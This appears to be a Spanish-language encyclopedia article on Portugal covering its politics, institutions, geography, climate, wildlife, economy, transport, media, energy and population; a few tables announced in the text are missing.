El 25 de noviembre de 1975 los paracaidistas y la policía militar de la Región Militar de Lisboa, aliados con diversos sectores de la izquierda radical, llevaron a cabo una tentativa de golpe de Estado sin un liderazgo claro. El grupo de los Nueve reaccionó poniendo en práctica un plan militar de respuesta, liderado por António Ramalho Eanes, que resultó un éxito. Al año siguiente se consolidó la democracia y el propio Ramalho Eanes fue nombrado presidente, el primero elegido por sufragio universal. Se aprobó una constitución democrática y se establecieron los poderes políticos locales —las autarquías— y los gobiernos autónomos regionales de Azores y Madeira.

Entre las décadas de 1940 y 1960, Portugal fue miembro cofundador de la OTAN (1949), la OCDE (1961) y la EFTA (1960), de la que se salió en 1986 para adherirse a la entonces CEE. En 1999, Portugal se adhirió a la zona Euro y ese mismo año entregó la soberanía de Macao a la República Popular China. Desde su adhesión a la UE, el país ha presidido el Consejo Europeo tres veces, la última en 2007 cuando presidió la ceremonia de la firma del tratado de Lisboa.

En Portugal la ley principal es la constitución, que data del año 1976 y que regula todas las demás. El resto de leyes relevantes del estado luso son el Código Civil (1966), el Código Penal (1982), el Código de Comercio (1888), el Código de Proceso Civil (1961), el Código de Proceso Penal y el Código del Trabajo. Todos estos códigos han sido revisados desde que se publicaron originalmente.

Existen cuatro órganos de soberanía que son el presidente de la república, la Asamblea de la República, el gobierno y los tribunales. El país tiene un régimen semipresidencialista, que en las sucesivas reformas constitucionales ha ido reduciendo el poder del presidente de la República.

El presidente de la República es el jefe de Estado, elegido por sufragio universal para un mandato de cinco años. Ejerce una triple función: controla la actividad del gobierno, es comandante supremo de las fuerzas armadas y representa formalmente el estado portugués en el exterior. Reside oficialmente en el palacio de Belém, en Lisboa.
La Asamblea de la República, que se reúne en el palacio de São Bento en Lisboa, se elige para un mandato de cuatro años. Está compuesta por 230 diputados, pero puede variar entre 180 y 230. El país está dividido en 22 circunscripciones electorales y los diputados son elegidos mediante un sistema de representación proporcional. El presidente de la República es el encargado de disolver el parlamento, convocar nuevas elecciones.

El gobierno está dirigido por el primer ministro, que ha sido siempre el líder del partido más votado en cada elección legislativa y es designado por el presidente de la República para formar gobierno. El primer ministro nombra también a los restantes ministros y vive en la residencia oficial del primer ministro, cerca del palacio de São Bento en Lisboa.

Los tribunales administran la justicia en nombre del pueblo, defienden los derechos e intereses de los ciudadanos, impiden la violación de la legalidad democrática y dirimen los conflictos de interés que pueden existir entre las diferentes instituciones. La constitución portuguesa establece los siguientes tribunales: el Tribunal Constitucional, el Supremo Tribunal de Justicia y los tribunales judiciales de primera instancia (Tribunales de Comarca) y de segunda instancia («Tribunal de Relación»); el Supremo Tribunal Administrativo y los tribunales administrativos y fiscales de primera y segunda instancia (Tribunales Centrales Administrativos) así como el Tribunal de Cuentas.

Desde 1975, el panorama político portugués ha estado dominado por dos partidos: el Partido Socialista (PS) y el Partido Social Demócrata (PSD). Estos partidos gobiernan la mayor parte de los municipios desde la instauración de la democracia. No obstante, partidos como el Partido Comunista Portugués (PCP), que dirige algunos municipios y tiene gran influencia en el movimiento sindical, o el Centro Democrático Social-Partido Popular (CDS-PP), que ha gobernado el país coaligado tanto con el PS como con el PSD, también detienen cierta importancia. Además de estos, tienen representación parlamentaria el Bloco de Esquerda (BE) y el Partido Ecologista "Os Verdes" (PEV).

Las últimas elecciones legislativas se celebraron el 4 de octubre de 2015. La participación fue del 55,86 % y los resultados fueron los siguientes:

Portugal posee la alianza más antigua del mundo que aún está en vigor: la alianza anglo-portuguesa, firmada con Inglaterra en 1373. El país es, asimismo, miembro fundador de la OTAN (1949), la OCDE (1961) y la AELC (1960), que abandonó en 1986 para unirse a la Unión Europea y también es fundador de la Agencia Internacional de las Energías Renovables. En 1996 cofundó la Comunidad de Países de Lengua Portuguesa (CPLP) para mejorar sus lazos con el resto de los países donde el idioma oficial es el portugués.

Portugal es miembro de la Unión Europea desde 1986 y el 25 de junio de 1992 firmó el Acuerdo de Schengen. Ha ocupado la presidencia del Consejo Europeo en tres ocasiones (1996, 2000 y 2007). En 2007, la última vez que el país ocupó la presidencia del Consejo de Europa, se firmó el Tratado de Lisboa.

Portugal es un país activo dentro de la Organización del Tratado del Atlántico Norte (OTAN) y ha enviado tropas en misión de paz a los Balcanes. Junto con España, Portugal forma parte de la Cumbre Iberoamericana, cuyo objetivo principal es ampliar los nexos de unión entre las naciones ibéricas y las naciones iberoamericanas. También ayudó económica y militarmente a Timor Oriental, una antigua colonia, para lograr su independencia de Indonesia, apoyando a la joven nación en las negociaciones con otros países asiáticos y en las deliberaciones de las Naciones Unidas.

El único litigio internacional que Portugal mantiene es con respecto al municipio español de Olivenza, que perteneció a Portugal desde 1297 hasta 1801, año en que fue cedido a España en virtud del tratado de Badajoz, que puso fin a la Guerra de las Naranjas. Portugal alegó en 1815 que le pertenecía la soberanía sobre este territorio según lo firmado en el Congreso de Viena. Asimismo, existió un litigio por las Islas Salvajes aunque España ya le reconoce la soberanía pero aun así sigue habiendo problemas con respecto a las delimitaciones de las ZEE. A pesar de todo, las relaciones diplomáticas bilaterales entre los dos países ibéricos son cordiales.

Las fuerzas armadas de Portugal tienen tres ramas: Ejército, Marina y Fuerza Aérea. El ejército portugués sirve principalmente como una fuerza de autodefensa, cuya misión es proteger la integridad territorial del país, prestar asistencia humanitaria y garantizar la seguridad de sus intereses en el extranjero. Desde 2004, el servicio militar no es obligatorio. Asimismo, la edad para el reclutamiento voluntario se ha fijado en 18 años. En 2010, el número de efectivos militares en Portugal era de 50.000 militares, de los cuales 7500 (15 %) eran mujeres. El presupuesto de Defensa para 2012 es de 2216 millones de euros y significó una rebaja de cerca del 4 % con respecto al año anterior.

En el siglo XX, Portugal participó en dos grandes intervenciones militares: la Primera Guerra Mundial y la guerra colonial portuguesa (1961-1974). El descontento provocado por guerra colonial fue un factor clave en la sublevación de parte del ejército el 25 de abril de 1974, la que provocó la caída de Marcelo Caetano y la consiguiente llegada de la democracia a Portugal con la aprobación de la Constitución portuguesa de 1976, aún en vigor.

En los últimos años, ha colaborado en misiones de mantenimiento de la paz en Timor Oriental, Bosnia, Kosovo, Afganistán, Irak (específicamente en Nasiriya) y en Líbano. Más recientemente, en 2011, ha participado en la Operación Atalanta cuyo objetivo es combatir la piratería marina en las costas de Somalia. Los Estados Unidos mantienen una presencia militar en Portugal con 770 efectivos en la base de Lajes en las islas Azores. La base emplea a 683 portugueses y es la principal fuente de trabajo de la isla de Terceira por detrás de la Administración Pública.

La seguridad de la población está a cargo de la Guarda Nacional Republicana (GNR) y de la Policía de Seguridad Pública (PSP). Además de estos cuerpos, Portugal cuenta con la Policía judicial (PJ), que es el principal órgano policial de investigación criminal del país y que fue creado para combatir el crimen organizado, el terrorismo, el tráfico de estupefacientes, la corrupción y los delitos económicos y financieros. La Policía judicial forma parte del Ministerio de Justicia y actúa bajo las órdenes del Ministerio Público.

Es de considerar que una de las mayores asociaciones a favor de los derechos humanos en el mundo, Amnistía Internacional, tiene su origen en un hecho acaecido en Portugal. En 1961, el abogado inglés Peter Benenson empezó una campaña llamada «Appeal for Amnisty», con la publicación del artículo «The forgotten prisioners» en el periódico "The Observer". Este artículo hacía mención al encarcelamiento de dos estudiantes portugueses por brindar por la libertad. Esta campaña fue el germen de la asociación, que cuenta hoy en día con más de dos millones de miembros.

El informe de 2008 de Amnistía Internacional denunció algunos casos de violencia policial sobre detenidos en Portugal. Asimismo, dejó constancia de la creación de una nueva ley de Inmigración, que otorgaba más derechos a los migrantes y ponía mayor énfasis en su lucha contra las mafias; de la creación de un nuevo plan general contra la violencia contra las mujeres (en 2006 murieron 39 mujeres a manos de sus parejas según datos del gobierno) y de la apertura de una investigación sobre presuntos vuelos de la CIA para entregas extraordinarias que hicieron escala en Portugal.

Las principales divisiones administrativas de Portugal son sus 18 distritos continentales y sus dos regiones autónomas (Azores y Madeira). Estos se subdividen a su vez en 308 "concelhos" o y estos nuevamente en 4260 . Los distritos son la subdivisión del país más relevante y sirven de base para diferentes divisiones administrativas como las circunscripciones electorales. Antes de 1976, los dos archipiélagos atlánticos estaban integrados también en la estructura general de los distritos portugueses, aunque con una estructura administrativa diferenciada, tal y como aparecía en el Estatuto de los Distritos Autónomos de las Islas Adyacentes, que le otorgaba unas Juntas Generales con competencias propias. Había tres distritos autónomos en las Azores y uno en Madeira:

Después de 1976, Azores y Madeira pasaron a tener estatuto de región autónoma y dejaron de estar divididas en distritos para pasar a tener un estatuto político-administrativo y órganos de gobierno propios. Actualmente la división administrativa de Portugal es la siguiente:

Las áreas urbanas, que pueden definirse como unidades territoriales continuas formadas por la agrupación de "concelhos", son otra forma de división administrativa portuguesa que se está implantando a diferentes velocidades. Existen dos tipos de áreas urbanas:

Portugal está formado por un territorio continental situado en el suroeste de Europa que abarca 92 090 km² de superficie. El país ocupa una gran parte de la costa atlántica de la península ibérica y dos archipiélagos situados en el océano Atlántico: Madeira y Azores, con un total de 440 km² de zona marítima. Su zona continental tiene frontera con una única nación, España, al este y al norte, a lo largo de 1224 km, limitando al sur y al oeste con el océano Atlántico Norte a lo largo de 1793 km de costa.

Su territorio continental es atravesado por su río principal, el Tajo, que divide el país en dos por la mitad. En el norte, el paisaje es montañoso en las zonas del interior con planaltos intercalados que permiten el desarrollo de la agricultura. En el sur, hasta el Algarve, el relieve se caracteriza por la presencia de planicies, aunque existen algunas sierras intercaladas. Otros ríos principales son el Duero, el Miño y el Guadiana que, al igual que el Tajo, nacen en España. Entre los ríos que tienen todo su curso por territorio portugués destacan el Voga, el Sado y el más largo, el Mondego, que nace en la sierra de la Estrella. En esta sierra donde se halla la montaña más alta del Portugal continental y el segundo pico más alto de Portugal, con 1993 msnm de altitud (sólo por detrás de la Montaña del Pico en las Azores).

Las islas Azores se localizan en el rift medio del océano Atlántico. Algunas de las islas han tenido actividad volcánica recientemente: São Miguel (1563) y Capelinhos (1957), que aumentó el área occidental de la isla de Faial. El Banco D. João de Castro es un gran volcán submarino situado entre las islas Terceira y São Miguel y está a 14 m bajo la superficie del mar. Entró en erupción en 1720 y formó una isla que permaneció sobre el agua durante varios años, y se estima que una nueva isla podría surgir en un futuro no muy lejano. Como ya se ha mencionado, el punto más alto de Portugal es la Montaña del Pico en la isla del Pico, un volcán que alcanza los 2351 msnm de altitud.
Las islas de Madeira, al contrario que las Azores, se sitúan en el interior de la placa africana y su formación se debe a la actividad de un punto caliente no relacionado con la tectónica de placas. Esta situación de estabilidad y la localización en el interior de la placa tectónica hace que esta sea la región de Portugal que menos terremotos sufre. La última erupción volcánica de la que queda evidencia sucedió hace alrededor de 6000 años, en la isla de Madeira donde actualmente se manifiesta un vulcanismo de forma indirecta a través de la liberación de gases volcánicos profundos y aguas calientes y gasificadas cuando se abren túneles de carretera y galerías para captar aguas en el interior de la isla principal. El punto más alto del archipiélago es el Pico Ruivo con 1862 msnm de altitud, que también es el tercer punto más alto del país.

La costa portuguesa es extensa: tiene 1230 km en Portugal continental, 667 km en las Azores y otros 250 km en Madeira, donde también se incluyen las islas Salvajes, islas Desertas y la isla de Porto Santo. La costa está formada por playas con multitud de acantilados y arenales. Una peculiaridad importante de la costa portuguesa es la ría de Aveiro, estuario del río Voga, cerca de la ciudad de Aveiro, con 45 km de largo y un máximo de 11 km de ancho, que es rica en peces y aves marinas. En ella existen cuatro canales, y entre estos varias islas e islotes donde los cuatro ríos se encuentran con el océano. Con la formación de cordones litorales se definió una laguna, considerada como uno de los elementos hidrográficos más relevantes de la costa portuguesa. Portugal, a su vez, posee una de las mayores Zonas económicas exclusivas (ZEE) de Europa, una franja marítima con cerca de 1 683 000 km².

Portugal tiene un clima mediterráneo, "Csa" en el sur y "Csb" en el norte, según la clasificación climática de Köppen. Es uno de los países europeos con mayor diversidad climática: la temperatura media anual en el Portugal continental varía de los 13 °C en el interior montañoso hasta los 18 °C en el sur, en la depresión del Guadiana. Los veranos son agradables en las tierras altas del norte del país y en la región litoral del extremo norte y en el centro. El otoño y el invierno son típicamente ventosos, lluviosos y frescos y son más fríos en los distritos del norte y del centro del país, en los cuales las temperaturas son negativas en los meses más fríos. Sin embargo, en las ciudades más al sur, las temperaturas solo bajan de los 0 °C en contadas ocasiones y rondan los 5 °C en la mayoría de los casos.

Normalmente, los meses de primavera y verano son soleados y las temperaturas son altas durante los meses secos de julio y agosto en los que se pueden superar en algunas ocasiones los 40 °C en buena parte del país, aunque con mayor frecuencia en el interior del Alentejo.

La precipitación media anual varía de poco más de 3000 mm en las montañas del norte a menos de 600 mm en las zonas del sur del Alentejo. Portugal tiene sobre 2500-3200 horas de sol al año con una media de entre 4 y 6 horas diarias en invierno y de entre 10 y 12 en verano, con valores superiores en el sudeste e inferiores en el noroeste. Nieva de forma regular en cuatro distritos del norte de Portugal (Guarda, Bragança, Vila Real y Viseu) pero su frecuencia disminuye hacia el sur, hasta ser inexistente en la mayor parte del Algarve. En invierno se registran temperaturas inferiores a -10 °C y se producen nevadas con cierta frecuencia en puntos aislados, como la sierra de la Estrella, la sierra de Gerês y la sierra de Montesinho, donde puede nevar de octubre a mayo.

La flora y fauna de Portugal se divide entre dos regiones biogeográficas bien diferenciadas: la región Macaronésica (Azores y Madeira) y la península ibérica (Portugal continental).

Destaca en su patrimonio natural, un lugar declarado patrimonio de la Humanidad por la Unesco en 1999 por el tamaño y calidad de la laurisilva, un tipo de bosque de laurel: la Laurisilva de Madeira. Cuenta con siete reservas de la biosfera: Paúl do Boquilobo (1981), isla de Corvo (2007), isla Graciosa (2007), isla de Flores (2009), Geres-Xures, transfronterizo con España, el archipiélago de las Berlengas (2011) y Santana (2011). Un total de 86 581 hectáreas están protegidas como humedales de importancia internacional al amparo del Convenio de Ramsar, en total, 28 sitios Ramsar.

En cuanto a los bosques de Portugal continental, están muy difundidos por razones económicas el pino, especialmente el resinero ("Pinus pinaster") y el piñonero ("Pinus pinea"), el castaño ("Castanea sativa"), el alcornoque ("Quercus suber"), la encina ("Quercus ilex"), el quejigo ("Quercus faginea") y el eucalipto ("Eucalyptus globulus"). Según datos de 2001, los bosques más comunes de Portugal son:

Asimismo, se están introduciendo otras especies como la "Gaillardia aristata" en los archipiélagos de las Azores y Madeira; la "Jacobaea minuta", en el sur de Portugal; la "Rhaponticum longifolium", en los alrededores de Leiria; el clavel de Indias ("Tagetes patula"), en la frontera de la provincia de Salamanca; la "Zinnia elegans", en la región de la Beira Alta, la "Salvia viridis", en Estremadura; la coronilla rosa ("Securigera varia") en Coímbra o la "Claytonia perfoliata" al norte de Portugal.

La fauna de mamíferos es muy variada e incluye el zorro, el tejón, el lince ibérico, el lobo ibérico, la cabra montés, el gato montés, la liebre, la comadreja, el meloncillo, la jineta y, ocasionalmente, el oso pardo (cerca del río Miño y del Parque Nacional de Peneda-Gerês), entre otros. Portugal es un lugar de parada importante para las migraciones de aves que se desplazan entre Europa y África, especialmente en lugares como el cabo de San Vicente o la sierra de Monchique. El país tiene cerca de 600 especies de aves, de las cuales 235 son nidificantes, y casi todos los años hay registros nuevos.
Portugal tiene un gran número de especies de peces de agua dulce que van desde el pez gato gigante en el Parque Natural del Tajo Internacional, hasta las pequeñas especies endémicas que solo viven en pequeños lagos. Algunas de estas especies raras están gravemente amenazadas debido a la destrucción de su hábitat, la contaminación y las sequías. Las aguas marinas portuguesas son de las más ricas en biodiversidad del mundo, pues sus especies marinas rondan el millar e incluyen la sardina, el atún y la caballa del Atlántico.

En Portugal puede apreciarse el fenómeno de la surgencia, especialmente en la costa oeste, lo que hace que el mar sea extremadamente rico en nutrientes y biodiversidad. Las incluyen un parque nacional, trece parques naturales, nueve reservas naturales, cinco monumentos naturales y seis paisajes protegidos. En 2005, el área de paisaje protegido del Litoral de Esposende fue clasificado como parque natural para la «conservación del cordón litoral y de sus elementos naturales físicos, estéticos y paisajísticos.»

Portugal se ha convertido en una economía diversificada y cada vez más basada en el sector servicios desde que ingresó en la Unión Europea en 1986. Los diferentes gobiernos han realizado un vasto programa de reformas: han privatizado muchas empresas estatales y han liberalizado las áreas dominantes de la economía, incluyendo los sectores financieros y de las telecomunicaciones. Portugal es miembro de la Unión Monetaria Europea (EMU) desde sus inicios en 1998. El 1 de enero de 2002 comenzó a circular su nueva moneda, el euro, a la vez que en otros 11 países miembros de la UE.

Entre 1991 y 2000, el desarrollo económico estuvo por encima del promedio de la Unión Europea. La lista anual de competitividad de 2005 del Foro Económico Mundial, colocaba a Portugal en el puesto 22º, por delante de países como España, Irlanda, Francia, Bélgica o la ciudad de Hong Kong. No obstante, el país ha ido perdiendo competitividad y en 2012 ocupaba el puesto 45, solo por encima de Chipre, Hungría, Malta, Eslovenia y Letonia en el ámbito de la Unión Europea.

Portugal tiene un pasado eminentemente agrícola aunque, tras el desarrollo que el país ha registrado en las décadas de 1980 y 1990, la estructura se basa en los servicios y la industria, que en 2010 representaban el 74,5 % y el 22,8 % del VAB, respectivamente. La agricultura portuguesa está bastante desarrollada gracias al clima, al relieve y a los suelos favorables. En las últimas décadas se ha intensificado la modernización agrícola pero aún el 10,9 % de la población trabaja en el sector. Los olivares (4000 km²), los viñedos (3750 km²), el trigo (3000 km²) el maíz (2680 km²). Los vinos, especialmente el vino de Oporto y el vino de Madeira, y los aceites portugueses son bastantes conocidos. También Portugal es productor de fruta, sobre todo las naranjas del Algarve, la pera rocha de la región Oeste, la cereza de Gardunha y el plátano de Madeira. También son importantes la remolacha dulce, el aceite de girasol y el tabaco.

La importancia económica de la pesca ha ido disminuyendo y emplea a menos del 1 % de la población activa. La disminución de "stocks" de recursos pesqueros se ha visto reflejado en las reducción de la flota pesquera portuguesa que, aunque se ha modernizado, aún tiene dificultades para competir con otras flotas europeas. A pesar de la reducida extensión de la plataforma continental portuguesa, existe una gran diversidad de especies en las aguas de la ZEE de Portugal, que es una de las mayores de Europa. La flota portuguesa realiza capturas en aguas internacionales y en las ZEE de otros países. Las especies que más se capturan son las sardinas, la caballa, el pulpo, el pez sable, el peto y el atún. Los puertos con mayor desembarco de pescado en 2001 fueron los de Matosinhos, Peniche, Olhão y Sesimbra.

El corcho tiene una producción bastante significativa, ya que de Portugal sale el 54 % del corcho que se produce en el mundo. Los minerales más significativos de Portugal son el cobre, el litio, el wolframio, el estaño, el uranio, el feldespato, la sal, el talco y el mármol.

La balanza comercial portuguesa es deficitaria y el valor de las exportaciones apenas cubren el 65 % del valor de las importaciones en 2010. Las mayores exportaciones corresponden a los tractores, los aparatos y materiales eléctricos, los combustibles y aceites minerales, las máquinas y aparatos mecánicos, las materias plásticas y sus manufacturas, el papel y el cartón y las prendas de vestir de punto, entre otros. Los principales países de los que Portugal importa productos son miembros de la Unión Europea: España, Alemania, Francia y Reino Unido.

El 16 de mayo de 2011, los líderes de la eurozona aprobaron oficialmente un paquete de rescate de 78 000 millones de euros para Portugal. El préstamo de rescate será distribuido entre el Mecanismo Europeo de Estabilidad Financiera, el Fondo Europeo de Estabilidad Financiera y el Fondo Monetario Internacional. De acuerdo al ministro de Finanzas portugués, el tipo medio de interés del préstamo de rescate se esperaba que fuera de un 5.1 %. Portugal se convirtió así en el tercer país de la eurozona, tras Irlanda y Grecia, en recibir un rescate financiero.

Portugal es un país donde el sector terciario es el preponderante. No obstante, el sector primario sigue siendo muy importante. Así, en el primer trimestre de 2012, el sector servicios ocupaba a algo más de 3 millones de personas (62,5 %), siendo los subsectores más importantes el comercio (724 500 personas), la educación (384 000) y la sanidad (351 600). El sector secundario ocupaba al 27,5 % de la población activa (1,3 millones de personas), desglosado en 958 900 a la industria y 447 100 a la construcción. El sector primario daba trabajo a 487 400 personas (10 %).

Según datos del Instituto Nacional de Estadística de 2012, el desempleo había aumentado hasta situarse en el 14,9 % en el primer trimestre de 2012. Este afectaba más a las mujeres (15,1 %) y a los jóvenes (36,2 %). Por regiones, las más castigadas por el desempleo eran el Algarve (20 %) y Lisboa (16 %) y las que menos paro registraron fueron la Zona Centro con 11,8 % y las Azores (13,9 %). Por su parte, la población inactiva representa el 39,2 % de la población total.

En 2012, en torno al 11 % de los licenciados universitarios estaban en paro; cerca de 115 000 personas con título universitario se encontraban desempleados. De acuerdo al Eurostat, Portugal era el noveno país más pobre de los veintisiete estados miembro de la Unión Europea en cuanto a poder adquisitivo, para el periodo 2005-2007. La última encuesta europea a trabajadores (publicada en 2007, y que forma la base del estudio de investigación de 2009) demuestra que Portugal es el quinto país europeo con menor calidad de trabajo.

Portugal forma parte de la Organización Mundial del Turismo desde 1976. En 2011 se celebró el centésimo aniversario de la difusión turística en Portugal. El turismo es un sector económico muy importante para la nación ya que representa el 10 % del empleo y el 11 % del PIB. El número de visitantes ha ido aumentando de forma significativa en Portugal hasta alcanzar los 6,4 millones en 2010; estos procedieron en su mayoría de España (21,9 %), Reino Unido (16,3 %), Alemania (10,8 %) y Francia (9,1 %).

El tipo de turismo más importante es el denominado «de sol y playa» y se concentra en el Algarve, Madeira y las Azores, aunque también destaca Lisboa como destino turístico. No obstante, el gobierno portugués sigue promocionando nuevos destinos turísticos como el valle del Tajo, Lisboa, las Beiras, Oporto y el norte de Portugal. También se fomenta bastante el turismo termal. En 2006, Lisboa fue la segunda ciudad europea, tras Barcelona, que mayor número de pernoctaciones registró, con 7 millones. No obstante, el destino que más se dinamizó fue el norte de Portugal, sobre todo Oporto, debido a los vuelos de bajo coste.

A pesar de que en los últimos años ha perdido cuota de visitantes, siendo superada por países como Turquía, Hungría, Malasia o Tailandia, Portugal es el 18º destino turístico por volumen de visitantes. El objetivo del último Plan Estratégico Nacional del Turismo fue conseguir alrededor de 21 millones de turistas para 2015, así como registrar unos ingresos de entre 14,5 y 15,5 millones de EUR en ese mismo año.

El transporte fue visto como una prioridad a comienzos de la década de 1990, empujado por el rápido crecimiento en el uso de los automóviles y la industrialización. El país cuenta con una red de carreteras de 82 900 km, de los cuales al menos 3000 km son parte del sistema de 44 autopistas. Portugal fue uno de los primeros países del mundo en tener una autopista, en 1944, y unía Lisboa con el Estadio Nacional, en lo que sería en el futuro la autovía Lisboa-Cascais (ahora A5). Sin embargo, aunque se construyeron otros tramos de autopistas en las década de 1960 y 1970, fue solo a finales de los años 1980 cuando comenzó la construcción de autopistas a gran escala. Actualmente la red de autopistas y autovías están muy desarrollada y une la costa con las principales ciudades del interior, con una red de 3000 km. También existen e que pueden estar compuestos por autovías y vías rápidas.

Las dos zonas metropolitanas más grandes cuentan también con redes de metro: el Metro de Lisboa y el Metro Sul do Tejo en el Área Metropolitana de Lisboa y el Metro de Oporto en el Área Metropolitana de Oporto, cada una con más de 35 km de líneas. En Portugal, el servicio de la red de tranvías de Lisboa ha sido proporcionado por la "Companhia de Carris de Ferro de Lisboa" (Carris), durante más de un siglo. En Oporto, una red de tranvía, de las cuales solo permanece una línea turística en las orillas del río Duero en servicio, comenzó a ser construida el 12 de septiembre de 1895, la primera en la península ibérica. Todas las grandes ciudades y pueblos tienen su propia red de transporte urbano local, así como servicio de taxis.

El transporte ferroviario de pasajeros y mercancías deriva del uso de los 3319 km de líneas férreas actualmente en servicio, de los cuales 1436 km están electrificadas y en unos 900 km de estas los trenes pueden circular a velocidades superiores a los 120 km/h. La red de ferrocarril está gestionada por REFER mientras que el transporte de pasajeros y mercancías es responsabilidad de Comboios de Portugal (CP), siendo ambas compañías estatales. En 2010 CP transportó a 130 millones de pasajeros y 9 750 000 Tm de mercancías.

La posición geográfica de Lisboa lo convierte en punto de escala para muchas compañías aéreas extranjeras hacia al resto de aeropuertos del país. Por ello, el gobierno decidió en 2008 construir un nuevo aeropuerto a las afueras de Lisboa, en Alcochete, para reemplazar al Aeropuerto Portela de Lisboa. Actualmente el país posee cerca de 65 aeropuertos, de los cuales los más importantes son el de Portela en Lisboa (centro de conexión de TAP Portugal), Faro, Oporto, Funchal (Madeira) y Ponta Delgada (Azores). Los principales puertos de Portugal son los de Leixões, Lisboa, Setúbal y Sines. El país también posee cerca de 210 km de hidrovías.

Portugal tiene una de las mayores tasas de uso de telefonía móvil en el mundo, pues el número de teléfonos móviles ha superado a la población total (en 2011 el número de teléfonos móviles era de 13 100 000). Esta red también tiene conexiones inalámbricas a Internet móvil y alcanza a todo el territorio. A finales del tercer trimestre de 2011 en Portugal había cerca de 2,6 millones de usuarios con acceso a internet de banda ancha móvil y cerca de 2,2 millones de usuarios de banda ancha fija.
La mayoría de los portugueses tiene acceso a la televisión por cable de pago. A finales del primer trimestre de 2008, los consumidores de servicios de TV por cable o satélite (DTH) eran el 36,2 % de los hogares. La penetración de este servicio es superior a la media en las regiones autónomas de Azores y Madeira.

Por iniciativa gubernamental, se constituyó la Radio y Televisión de Portugal (RTP) el 15 de diciembre de 1955. En 1975 la empresa se nacionalizó y se convirtió primero en la empresa pública Radiotelevisión Portuguesa y más tarde Radio y Televisión de Portugal. A finales de siglo, el Estado concedió permisos para la creación de dos emisoras de televisión: Sociedade Independente de Comunicação en 1992 y Televisão Independente en 1993. Actualmente, estos son los únicos cuatro canales con señal en abierto en Portugal pero existen además dos canales regionales: RTP Azores (1975) y RTP Madeira (1972). La Radio y Televisión de Portugal (RTP) tiene también tres emisoras de radio: Antena 1, Antena 2 y Antena 3. Además, existen tres emisoras privadas, de las cuales las más antiguas y conocidas son Rádio Renascença, Rádio Comercial y Rádio Clube Português.

El diario "Açoriano Oriental" se fundó el 18 de abril de 1835 y es considerado el más antiguo de Portugal y de los diez más antiguos del mundo. Con el paso del tiempo han ido surgiendo varios periódicos, de los que se pueden destacar "O Século", "Diário de Notícias" y "Jornal de Notícias". En Portugal, existen varias revistas en los kioscos sobre las más variadas temáticas. Sin embargo, las que más lectores tienen son las que tratan sobre la crónica social, como "Nova Gente", "Caras", "Lux", "VIP" y "Flash", que también son las más vendidas.

Portugal es un país altamente deficitario en términos energéticos e importa la totalidad de los combustibles fósiles que consume. Esto implicó que en 2005 Portugal importara el 87,3 % de la energía total que consumió. En lo relativo a la producción de electricidad, Portugal produjo en 2005 el 85 % de la electricidad que consumió e importó el 15 % restante. La producción total de ese año fue de 46 575 GWh repartida del siguiente modo: no renovables el 80,8 %; de los cuales el 32,7 % del carbón, el 29,2 % del gas natural y el 18,9 % del petróleo y renovables el 19,2 %; de las cuales el 11 % procede de la energía hidroeléctrica, el 3,8 % de la energía eólica, el 3 % de la biomasa y el 1,4 % resto a otros. Sin embargo, por primera vez en su historia, en los primeros cinco meses de 2010 tuvo una balanza comercial de energía eléctrica positiva y exportó más energía de la que importó (982 GWh contra 946 GWh).

En 2007 comenzó a producir electricidad la mayor planta de energía solar del mundo en Brinches, poco antes de que la primera planta comercial de obtención de energía por oleaje abriera sus puertas, en septiembre de 2008, en Aguçadoura, al norte de Portugal. El país también aumentará la potencia instalada en parques eólicos, que pasará de 2000 MW a mediados de 2007 hasta alcanzar los 8500 MW en 2020, mientras que la potencia hidroeléctrica instalada pasará de 5000 MW en 2005 hasta 8600 MW en 2020.

Los datos sobre la composición genética de los portugueses señalan que existe una muy pequeña diferenciación interna y que tienen una base genética continental europea paleolítica.

En el s. XIX se empiezan a realizar censos en Portugal. El primer censo considerado moderno, ya que cumplía con una serie de estándares internacionales, se realizó el 1 de enero de 1854. Este abarcó todo el territorio nacional —tanto el continental como los archipiélagos—, pero no así las colonias que el país poseía en aquel momento. En 1868 se presentaron los resultados en un volumen de 340 páginas en el que se diferenciaba la población por distrito, concejo y freguesía y, en el caso de los archipiélagos, también por isla. Según este censo, en Portugal había en aquel momento 4 188 410 habitantes "de facto". Entre 1864 y 1911, la población portuguesa aumentó un 42 %, alcanzando los 5 547 708 de habitantes. Esto se debió a las mejoras económicas y de las condiciones de vida en general. Así, la última gran «crisis alimentaria» se produjo entre 1856 y 1857. La llegada, aunque tardía, de la industrialización a Portugal provocó un éxodo rural que supuso el abandono progresivo de los campos y un rápido crecimiento de las ciudades, sobre todo Lisboa y Oporto donde las personas se hacinaban en casas que ocupaban una manzana y en las que podían vivir más de 15 familias. El crecimiento antes mencionado también fue posible por la disminución de la emigración que se produjo tras la independencia brasileña y que solo volvería a aumentar tras el fin de la guerra entre Brasil y Paraguay en 1869. Esta fuerte emigración se tradujo en un envejecimiento de la población.

Ya en la década de 1960, se produjo un nuevo éxodo rural que atrajo a las personas a las grandes ciudades y a los núcleos turísticos y despobló las zonas del interior, especialmente aquellas que se encontraban próximas a las fronteras con España.

Portugal era un país de emigrantes hasta 1970, lo cual hizo que la población apenas creciera. Sin embargo, la llegada de la democracia y la pérdida de las colonias dio la vuelta a la situación y Portugal experimentó un "boom" demográfico. Desde entonces, el número de inmigrantes no ha dejado de aumentar y así, entre 1980 y 2001, el número de inmigrantes legales en suelo portugués se ha multiplicado por 6. Esto ha hecho que la población no haya envejecido tanto como en otros países del norte y el centro de Europa.

La población portuguesa está compuesta por un 14,9 % de personas con edades comprendidas entre los 0 y los 14 años, un 65,9 % entre los 15 y los 64 y un 19,1 % con más de 65 años. La esperanza de vida media es de 78,54 años. La tasa de alfabetización se sitúa en el 93,3 %, según los datos de 2003. El crecimiento poblacional se sitúa en el 0,212 %, siendo la tasa de natalidad de 9,94 nacimientos por cada 10 000 habitantes y la tasa de mortalidad de 10,8 fallecidos por cada 10 000 habitantes. La tasa de fertilidad se sitúa en 1,5 hijos por mujer, lo que hace que el país tenga un crecimiento vegetativo nulo. Portugal se sitúa como uno de los países con la tasa de mortalidad infantil (4,66 por mil) más baja del mundo. A pesar de que Portugal es un país desarrollado, aún hay población sin acceso al agua corriente (un 8 % de la población en 2005) y la electricidad, aunque su número se va reduciendo.

En Portugal viven cerca de 451 000 inmigrantes (según datos de 2009), lo que representa el 5 % de la población portuguesa. La mayoría es oriunda de Brasil (115 882), de Ucrania (52 253) y de Cabo Verde (48 417), pero también de Moldavia, Rumanía, Guinea-Bisáu, Angola, Timor Oriental, Mozambique, Santo Tomé y Príncipe y Rusia.

